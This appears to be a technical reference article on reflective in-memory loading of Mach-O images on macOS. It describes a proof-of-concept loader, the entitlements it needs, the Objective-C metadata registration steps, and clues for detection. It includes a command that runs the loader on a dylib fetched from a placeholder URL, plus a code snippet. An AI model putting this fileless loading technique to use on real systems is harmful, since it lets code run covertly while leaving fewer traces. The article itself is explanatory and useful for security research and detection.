title: Reflective Mach-O Loading
html:
Reflective Mach-O Loading on macOS

A reflective loader maps a Mach-O image from bytes already in its own process, then links it and runs its initializers without asking the system loader to open a payload file. This is in-process code execution, not a privilege escalation or remote-process injection primitive.[2]

On recent macOS, the old NSCreateObjectFileImageFromMemory/NSLinkModule path writes the image to disk. ReflectiveLoader instead embeds older Apple dyld loading code; Wardle demonstrated this on macOS 15 and 26.[2][3]

If the loader uses the Hardened Runtime, its unsigned in-memory code needs an executable-memory exception such as com.apple.security.cs.allow-unsigned-executable-memory or com.apple.security.cs.disable-executable-page-protection; otherwise execution is blocked by code-signing enforcement. This is a loader signing constraint, not an elevation primitive. See the macOS entitlements reference.[2]

For the PoC, supply a URL serving a raw Mach-O bundle, framework, or dylib. Its main.mm rejects empty downloads and states that payloads using LC_DYLD_CHAINED_FIXUPS are unsupported. A local pathname is also accepted, but that input is not a fileless workflow. The URL form reads bytes into NSData and passes its buffer and length to custom_dlopen_from_memory.[4]

./PoC 'https://example.invalid/payload.dylib'

The embedded loader calls ImageLoaderMachO::instantiateFromMemory, then image->link. It registers Objective-C metadata after linking but before image->runInitializers, which executes constructors.[5] Without registration, a constructor that sends an Objective-C message can fail with unrecognized selector sent to instance.[3] See dyld's normal image-loading flow and the Mach-O sections reference.

Activating Objective-C metadata

Unlike normal dyld loading, embedding the older image loader does not automatically make the payload's Objective-C metadata usable by libobjc.[3] The adapted LLVM JIT approach scans the mapped __DATA and __DATA_CONST Objective-C sections, then performs these steps before constructors run:[1][5][6]

  1. Walk __objc_selrefs in sizeof(SEL) steps. Obtain each non-null selector's name with sel_getName, pass it to sel_registerName, and replace the section's pointer with the canonical SEL.
  2. Collect classes from __objc_classlist and register them with objc_readClassPair, resolving superclass dependencies first.
  3. Rewrite references in __objc_classrefs and __objc_superrefs to registered classes or metaclasses, and attach category methods from __objc_catlist.

For example, the selector repair in ObjCRuntime.cpp is equivalent to:[6]

for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}

The PoC relies on internal Objective-C runtime behavior and does not support every Mach-O format feature, so its registration code is an implementation reference rather than a generic drop-in loader.[1][4][6] Registration is needed for referenced Apple classes and methods as well as classes defined by the payload.[3]

A reflectively loaded image does not appear in dyld_all_image_infos in the author's tests. Its anonymous executable mappings can instead appear as unnamed dylib regions in vmmap; sampled frames can be shown as <unknown binary>. These are inspection clues rather than a reliable attribution to this loader, and access to another process's task information is entitlement-limited. See macOS memory dumping for process-access constraints.[3]
